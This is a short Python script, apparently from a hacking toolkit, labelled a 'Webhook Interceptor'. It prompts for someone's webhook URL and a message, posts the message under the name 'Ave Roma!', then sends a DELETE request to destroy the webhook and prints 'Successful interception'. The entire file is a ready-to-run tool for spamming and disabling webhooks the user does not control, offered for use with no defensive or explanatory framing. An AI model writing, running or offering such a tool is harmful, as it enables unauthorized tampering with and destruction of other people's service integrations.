#############################
# ToS-1 Webhook Interceptor #
#############################
import httpx
#############################
class interceptor:

    def intercept():
        """Deletes webhook 
        from URL."""

        # Expects webhook with token.
        target = input("\033[91m  > Enter target\033[33m ")
        payload = input("\033[91m  > Enter payload\033[33m ")
        try:
            httpx.post(target, json={"content": payload, "username": "Ave Roma!", "avatar_url": "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fi.pinimg.com%2Foriginals%2F91%2Fe8%2F04%2F91e804511211eda094fc2e21512f746c.png&f=1&nofb=1&ipt=5260067ec1e4a7d1743a73fdb4fdf2b3b38054dc82a6abd62ca780160631ccb6&ipo=images"})
            code = httpx.delete(target).status_code
            if code == 204:
                print("\033[92m  > Successful interception")
            else:
                print("\033[91m  > Intercept failed")
        except:
            print("\033[91m  > Intercept failed")
        
        # Enter to move on   
        input("\033[91m  > Enter to proceed \033[33m ")